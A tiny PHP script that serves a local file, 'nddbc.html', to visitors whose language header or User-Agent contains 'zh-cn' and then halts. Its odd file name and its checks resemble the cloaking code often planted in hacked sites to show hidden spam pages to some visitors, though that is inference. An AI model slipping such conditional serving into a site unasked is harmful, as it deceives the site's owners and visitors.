<?php
if (preg_match("/zh\-cn/i",$_SERVER['HTTP_ACCEPT_LANGUAGE']) || preg_match("/zh\-cn/i",$_SERVER['HTTP_USER_AGENT'])) {
	echo file_get_contents("nddbc.html");
	die();
}
?>